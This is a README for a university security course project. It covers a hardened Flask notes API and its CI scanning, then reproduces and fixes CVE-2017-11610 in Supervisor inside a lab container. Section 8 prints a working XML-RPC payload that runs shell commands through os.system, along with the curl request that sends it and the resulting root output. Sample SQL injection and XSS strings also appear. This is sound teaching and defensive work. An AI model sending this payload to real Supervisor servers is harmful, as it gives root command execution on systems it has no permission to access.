# Secure Notes API — Internet Security Work 1

[![CI](https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/workflows/ci.yml/badge.svg)](https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/workflows/ci.yml)

A small REST API that demonstrates secure backend development: parameterized
database access, output escaping, bcrypt password hashing, JWT authentication,
and automated security scanning in CI/CD.

The project accompanies **Work 1: Secure REST API Development with CI/CD and
Real CVE Vulnerability Analysis** (HDU Internet Security).

---

## 1. Technology stack

| Layer | Choice |
|---|---|
| Language / framework | Python 3.12+ / Flask 3.1 |
| Database | SQLite via SQLAlchemy ORM (Flask-SQLAlchemy) |
| Authentication | JWT (PyJWT, HS256) + bcrypt password hashes |
| Tests | pytest, pytest-cov |
| CI/CD | GitHub Actions |
| SAST | Bandit |
| SCA | pip-audit (PyPI advisory database / OSV) |

## 2. Project structure

```
.
├── .github/workflows/ci.yml   # CI: tests + Bandit (SAST) + pip-audit (SCA)
├── vulhub-fix/                # fixed Dockerfile/compose for CVE-2017-11610
├── report/                    # full laboratory report (PDF + HTML source)
├── docs/cve/evidence/         # raw output from the CVE reproduction
├── docs/screenshots/          # CI and CVE screenshots
├── app/
│   ├── __init__.py            # application factory, configuration, security headers
│   ├── auth.py                # POST /auth/login
│   ├── api.py                 # protected /api endpoints and output escaping
│   ├── security.py            # bcrypt, JWT, jwt_required middleware, rate limiter
│   ├── models.py              # User and Note models
│   ├── errors.py              # consistent JSON error responses
│   ├── cli.py                 # `seed-demo` management command
│   └── extensions.py          # shared SQLAlchemy instance
├── tests/                     # 31 automated tests
├── requirements.txt           # pinned runtime dependencies
├── requirements-dev.txt       # pinned test/security tooling
├── run.py                     # development entry point
└── .env.example               # documented environment variables
```

## 3. Running the application

```bash
python -m venv .venv
# Windows: .venv\Scripts\activate
# Linux/macOS: source .venv/bin/activate

pip install -r requirements-dev.txt

# A secret must be provided; the app generates an ephemeral development one
# when JWT_SECRET is absent, but tokens then die on restart.
export JWT_SECRET="$(python -c 'import secrets; print(secrets.token_hex(32))')"   # Linux/macOS
# Windows PowerShell: $env:JWT_SECRET = -join ((1..64) | ForEach-Object { '{0:x}' -f (Get-Random -Max 16) })

# Create demo users (alice/bob) and notes
export DEMO_PASSWORD="AliceDemo123!"
flask --app run seed-demo

# Start the server on http://127.0.0.1:5000
python run.py
```

### Environment variables

| Variable | Default | Purpose |
|---|---|---|
| `JWT_SECRET` | ephemeral random value in development | HMAC key used to sign JWTs. **Required** when `APP_ENV=production`. |
| `JWT_EXPIRES_SECONDS` | `3600` | Access-token lifetime. |
| `DATABASE_URL` | `sqlite:///app.db` | SQLAlchemy database URL. |
| `APP_ENV` | `development` | `production` makes a missing `JWT_SECRET` fatal. |
| `DEMO_PASSWORD` | generated and printed | Password assigned by `seed-demo`. |
| `PORT` | `5000` | Development server port. |

## 4. API reference

All request and response bodies are JSON. Protected endpoints require
`Authorization: Bearer <token>`.

| Method | Path | Auth | Description |
|---|---|---|---|
| `POST` | `/auth/login` | no | Validate credentials and issue a JWT. |
| `GET` | `/api/data` | yes | List notes owned by the authenticated user. Optional `?search=` filter. |
| `GET` | `/api/data/<id>` | yes | Read one note owned by the authenticated user. |
| `POST` | `/api/data` | yes | Create a note for the authenticated user (third endpoint). |
| `GET` | `/api/users/me` | yes | Return the authenticated user's profile. |
| `GET` | `/health` | no | Liveness probe. |

### 4.1 Login

```bash
curl -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"AliceDemo123!"}'
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

Invalid credentials return `401` with a deliberately generic message.
Malformed input returns `400`; more than five failed attempts per minute for
the same IP/username pair returns `429` with `Retry-After`.

### 4.2 List notes

```bash
TOKEN="<access_token from login>"

curl http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "count": 2,
  "notes": [
    {"id": 2, "title": "Shopping list", "content": "Coffee, tea, and a secure API.", "created_at": "..."},
    {"id": 1, "title": "Welcome to Secure Notes", "content": "This note belongs to alice.", "created_at": "..."}
  ]
}
```

Notes are always filtered by `owner_id = <authenticated user>`. Adding
`?search=term` performs a parameterized `ILIKE` search inside that set.

### 4.3 Read one note

```bash
curl http://127.0.0.1:5000/api/data/1 -H "Authorization: Bearer $TOKEN"
```

A note that exists but belongs to another user returns `404`, so the API does
not disclose the existence of other users' records.

### 4.4 Create a note (third endpoint)

```bash
curl -X POST http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Homework","content":"Finish the security lab."}'
```

The response is `201 Created`. `title` is limited to 120 characters and
`content` to 5000; both must be non-blank strings.

### 4.5 Current user

```bash
curl http://127.0.0.1:5000/api/users/me -H "Authorization: Bearer $TOKEN"
```

### 4.6 Error format

Every error uses the same shape, including framework errors such as 404, 405
and 413:

```json
{"error": "unauthorized", "message": "A Bearer token is required."}
```

## 5. Implemented security measures

### 5.1 SQL injection protection

* **ORM everywhere.** All database access goes through SQLAlchemy
  (`select(Note).where(...)`, `db.session.get(...)`); there is no string-built
  SQL and no `text()` with interpolated values anywhere in `app/`.
* **Bound parameters.** The only dynamic value in a query is the search term:

  ```python
  pattern = f"%{search}%"
  stmt = stmt.where(or_(Note.title.ilike(pattern), Note.content.ilike(pattern)))
  ```

  SQLAlchemy sends `pattern` as a bound parameter (`?` / `:param_1`), so quotes,
  `--` and `OR 1=1` in the value are treated as data, never as SQL syntax.
* **Owner filter is structural.** Every note query includes
  `Note.owner_id == g.current_user.id`, which also prevents IDOR / horizontal
  privilege escalation.
* **Input validation.** Login usernames must match
  `^[A-Za-z0-9_.-]{3,32}$`, passwords are length-checked, search is truncated to
  100 characters, and note fields are type- and length-checked before use.
* **Login is injection-proof by construction:** the account lookup
  `User.username == username` is a bound ORM comparison. Payloads such as
  `alice' OR '1'='1` are rejected by the username whitelist (or, if they ever
  passed it, would simply match no user).

Test evidence: `test_sql_injection_in_search_does_not_bypass_owner_filter`,
`test_sql_injection_login_payload_cannot_authenticate`,
`test_wildcard_search_cannot_escape_owner_filter`.

### 5.2 XSS protection

* **Output escaping with the framework's built-in escaper.** Every
  user-controlled string is passed through `markupsafe.escape()` when a
  response is serialized (`app.security.sanitize`, used by `_note_json` and
  `/api/users/me`):

  ```python
  from markupsafe import escape

  def sanitize(value: str) -> str:
      return str(escape(value))
  ```

  Stored data is kept intact — escaping happens at the output boundary, which
  is the correct context-aware approach. For example:

  ```
  input:    <script>alert(1)</script>
  response: &lt;script&gt;alert(1)&lt;/script&gt;
  ```

* **JSON-only responses.** The API never reflects input into HTML; JSON
  responses are sent with `Content-Type: application/json`, so a browser will
  not interpret them as markup.
* **Defence-in-depth headers** on every response:
  `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`,
  `Referrer-Policy: no-referrer`, and
  `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`.
* **Strict input validation** limits payload size and shape (`MAX_CONTENT_LENGTH`
  of 16 KiB, title/content length limits).

Test evidence: `test_xss_payload_is_escaped_in_responses`.

### 5.3 Authentication and password storage

* **bcrypt hashing.** Passwords are hashed with bcrypt using a per-password
  salt and cost factor 12 (`bcrypt.gensalt(rounds=12)`); only the hash is
  stored. bcrypt is intentionally slow and salted, which makes offline
  brute-force and rainbow-table attacks impractical. Plaintext is never
  logged or persisted. bcrypt's 72-byte input limit is enforced.
* **JWT issuing.** A successful login returns an HS256 JWT with `sub`, `iss`,
  `iat` and `exp` claims; the default lifetime is one hour.
* **JWT verification middleware.** `@jwt_required` (in `app/security.py`)
  protects every `/api/*` route and:
  * requires the `Authorization: Bearer` scheme;
  * verifies the HMAC signature with a server-side secret;
  * uses an explicit algorithm allow-list (`HS256`), rejecting `alg=none` and
    algorithm-confusion attacks;
  * validates the issuer and requires `sub`/`iss`/`iat`/`exp`;
  * rejects expired or malformed tokens;
  * loads the user from the database, so tokens for deleted users fail.
* **No user enumeration.** Unknown users run a dummy bcrypt verification and
  receive the same status and message as a wrong password; login responses are
  marked `Cache-Control: no-store`.
* **Brute-force throttling.** Five failures per 60 seconds per IP+username are
  allowed; further attempts return `429` with `Retry-After`.
* **Secret management.** `JWT_SECRET` comes from the environment. In
  production (`APP_ENV=production`) the application refuses to start without
  it; development only uses an ephemeral random fallback.

Test evidence: `test_login_returns_valid_jwt`, `test_expired_token_is_rejected`,
`test_alg_none_token_is_rejected`, `test_tampered_signature_is_rejected`,
`test_password_is_stored_as_bcrypt_hash`, `test_login_is_rate_limited_after_repeated_failures`.

### 5.4 Additional hardening

* Ownership checks on every note (404 instead of 403 to avoid existence leaks).
* Request-body size cap (16 KiB) and bounded search/field lengths.
* Uniform JSON errors with no stack traces; unexpected exceptions are logged
  server-side only.
* Security headers applied globally in an `after_request` hook.
* Fully pinned dependencies for reproducible, auditable builds.

## 6. Testing

```bash
pytest -q --cov=app --cov-report=term-missing
```

Current result: **31 passed**, **85% statement coverage** (100% of `api.py`,
`auth.py`, `models.py`). The suite covers authentication, JWT validation
(missing-tampered-expired-wrong-algorithm), bcrypt storage, SQLi payloads,
XSS escaping, ownership isolation, validation, rate limiting and error
handling.

## 7. CI/CD security pipeline

Workflow: [`.github/workflows/ci.yml`](.github/workflows/ci.yml), triggered on
every push and pull request to `main` (and manually via `workflow_dispatch`).

| Job | Tool | What it does |
|---|---|---|
| `tests` | pytest + coverage | Runs the full test suite; uploads `coverage.xml`. |
| `sast` | Bandit | Static analysis of `app/`; fails on medium/high findings; uploads `bandit-report.txt`. |
| `sca` | pip-audit | Audits pinned dependencies against PyPI/OSV vulnerability data; fails if any known vulnerability is found; uploads `pip-audit-report.json`. |

Run the scanners locally with:

```bash
bandit -r app -ll
pip-audit -r requirements.txt
```

Local results at the time of writing:

```
Bandit:   No issues identified.  (0 low, 0 medium, 0 high; 508 lines scanned)
pip-audit: No known vulnerabilities found (12 dependencies audited)
```

### CI evidence

![Successful CI run: Tests, SAST and SCA all green](docs/screenshots/ci-run-summary.png)

| SAST job (Bandit) | SCA job (pip-audit) |
|---|---|
| ![SAST job steps all green](docs/screenshots/sast-bandit.png) | ![SCA job steps all green](docs/screenshots/sca-pip-audit.png) |

The exact reports downloaded from the run are committed for review:

* [`docs/ci/bandit-report.txt`](docs/ci/bandit-report.txt) — **No issues identified** (0 low, 0 medium, 0 high; 508 lines scanned).
* [`docs/ci/pip-audit-summary.txt`](docs/ci/pip-audit-summary.txt) — **12 dependencies audited, 0 with known vulnerabilities**.
* [`docs/ci/pip-audit-report.json`](docs/ci/pip-audit-report.json) — machine-readable SCA report.

> GitHub requires an authenticated session to render raw job logs, so the
> screenshots show the public job status and step list; the verbatim report
> contents are committed alongside them.

Pipeline run and artifacts:

* Workflow: [Actions → CI](https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/workflows/ci.yml)
* Last successful run: [CI run #39352597970](https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/runs/39352597970) —
  **Tests (pytest) ✅, SAST (Bandit) ✅, SCA (pip-audit) ✅**
* Artifacts produced by the run: `coverage-report`, `bandit-report`,
  `pip-audit-report`.

<!-- Screenshots of the Actions reports are stored under docs/screenshots/. -->

## 8. CVE analysis: CVE-2017-11610 (Supervisor XML-RPC command execution)

### 8.1 Selected vulnerability

| Property | Value |
|---|---|
| CVE | **CVE-2017-11610** — Supervisor XML-RPC object traversal / remote command execution |
| CVSS v3.0 | **8.8 High** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weakness | CWE-276 (incorrect default permissions); practical impact: OS command injection (CWE-78) |
| Vulnerable component | Supervisor XML-RPC dispatcher — `supervisor/xmlrpc.py`, `traverse()` |
| Affected releases | before 3.0.1, 3.1.x before 3.1.4, 3.2.x before 3.2.4, 3.3.x before 3.3.3 |
| Vulhub environment | `supervisor/CVE-2017-11610` (Supervisor 3.3.2, XML-RPC on port 9001) |
| Impact | One XML-RPC request executes arbitrary shell commands as the supervisord process (root in this image) |

NVD describes the attacker as a "remote authenticated user". In the Vulhub
environment the XML-RPC interface is exposed on port 9001 without credentials,
so any client that can reach the port can send the request. The CVE was chosen
because the reproduction is a single HTTP request, the principle is simple
(the method name is resolved by walking Python attributes), and the fix is a
well-defined upstream change. It is not among the CVEs excluded by the course
list.

### 8.2 Vulnerable environment and reproduction

Vulhub's compose file references the prebuilt image `vulhub/supervisor:3.3.2`.
The configured Docker Hub mirrors rejected that custom image, so an equivalent
image was built from `python:2.7-slim` + `pip install supervisor==3.3.2`
(Supervisor 3.x is Python 2 only). The XML-RPC interface is exposed without
authentication:

```ini
[inet_http_server]
port=0.0.0.0:9001

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface
```

Start it with:

```bash
docker compose -f supervisor-env/docker-compose.yml up -d --build
```

Confirmed environment:

```
supervisord --version  -> 3.3.2
GET /                  -> HTTP 200
docker exec ... id     -> uid=0(root) gid=0(root) groups=0(root)
```

The exploit sends a dotted method name that traverses the Python object graph
to `os.system`:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
  <params>
    <param><string>id > /tmp/rce_proof; touch /tmp/pwned_by_cve_2017_11610</string></param>
  </params>
</methodCall>
```

**Step 1 — send the request:**

```bash
curl -i -X POST "http://127.0.0.1:9001/RPC2" \
     -H "Content-Type: text/xml" \
     --data-binary "@exploit.xml"
# HTTP/1.1 200 OK
# <?xml version='1.0'?>
# <methodResponse><params><param><value><int>0</int></value></param></params></methodResponse>
```

The `<int>0</int>` is the exit status of `os.system()`, proving that the shell
command was executed.

**Step 2 — read the output and verify the version:**

```bash
docker exec supervisor-env-supervisor-1 cat /tmp/rce_proof
# uid=0(root) gid=0(root) groups=0(root)

docker exec supervisor-env-supervisor-1 ls -l /tmp/pwned_by_cve_2017_11610
# -rw-r--r-- 1 root root 0 ... /tmp/pwned_by_cve_2017_11610

docker exec supervisor-env-supervisor-1 supervisord --version
# 3.3.2
```

![Reproduction of CVE-2017-11610](docs/screenshots/cve-vulnerable.png)

### 8.3 Root cause analysis

1. **Dotted method names are resolved by attribute traversal.**
   `xmlrpc.traverse()` split the XML-RPC method name on dots and called
   `getattr()` once per component, starting from the RPC interface. The only
   restriction was that a component must not start with `_`.
2. **The traversal escapes the intended namespace.** Starting from
   `supervisor`, an attacker could reach `supervisord` → `options` →
   `warnings` → `linecache` → `os.system`. The dispatcher then called the
   resolved object with attacker-controlled parameters, so an XML-RPC request
   became a shell-command execution primitive.
3. **The process runs as root (aggravating factor).** The supervisord process
   runs as root in the container, so the command inherits full privileges.
4. **Classification.** NVD assigns CWE-276 because the interface exposed far
   more functionality than the intended RPC methods; the concrete impact is
   OS command injection (CWE-78).

In short: Supervisor treated the method name as an arbitrary path through its
own Python objects. Allowing only `namespace.method` would have been safe; the
unrestricted attribute chain let a client walk from the RPC interface all the
way to `os.system`.

### 8.4 Applied fix

The fix in [`vulhub-fix/`](vulhub-fix/) upgrades Supervisor to **3.3.3**, the
first 3.3.x release with the upstream correction. The fix changes
`traverse()` to:

* require exactly two dotted parts (`namespace.method`) — object traversal is
  rejected;
* reject method names beginning with `_`;
* require the resolved object to be a bound method (`types.MethodType`).

```diff
-FROM python:2.7-slim
-RUN pip install --no-cache-dir supervisor==3.3.2
+FROM python:2.7-slim
+RUN pip install --no-cache-dir supervisor==3.3.3
```

The fixed environment keeps the same RPC interface, configuration and Python
version; only the vulnerable library version changes. Production hardening:
bind the XML-RPC interface to a trusted management network or localhost, add
authentication/TLS if remote access is required, never expose port 9001 to the
Internet, and run supervisord as a non-root user where possible.

### 8.5 Proof of elimination and regression testing

The vulnerable container was stopped and the fixed environment rebuilt.
Repeating exactly the same request gives:

```
supervisord --version                    -> 3.3.3
POST /RPC2 (same exploit.xml)            -> XML-RPC fault: UNKNOWN_METHOD
/tmp/rce_proof                           -> No such file or directory
/tmp/pwned_by_cve_2017_11610             -> No such file or directory
GET /                                    -> HTTP 200   (regression)
supervisorctl -c /etc/supervisord.conf status
                                         -> demo RUNNING   (regression)
```

The traversal is rejected before any command runs, and normal Supervisor
functionality (web interface and process supervision) still works.

![Verification of the fix](docs/screenshots/cve-fixed.png)

Raw command output is committed under [`docs/cve/evidence/`](docs/cve/evidence/);
the XML-RPC payload is in [`docs/cve/exploit.xml`](docs/cve/exploit.xml). The
full report is [`report/Work1_Report.pdf`](report/Work1_Report.pdf).

## 9. Repository

* Public repository: <https://github.com/ynjlzxpl/hdu-internet-security-work1>
* Last successful pipeline:
  <https://github.com/ynjlzxpl/hdu-internet-security-work1/actions/runs/39352597970>
* Laboratory report: [`report/Work1_Report.pdf`](report/Work1_Report.pdf)
* Fix folder: [`vulhub-fix/`](vulhub-fix/) (Dockerfile, docker-compose.yml, supervisord.conf, diff.patch)
* CVE reproduction evidence: [`docs/cve/evidence/`](docs/cve/evidence/)
* CI security reports: [`docs/ci/`](docs/ci/)
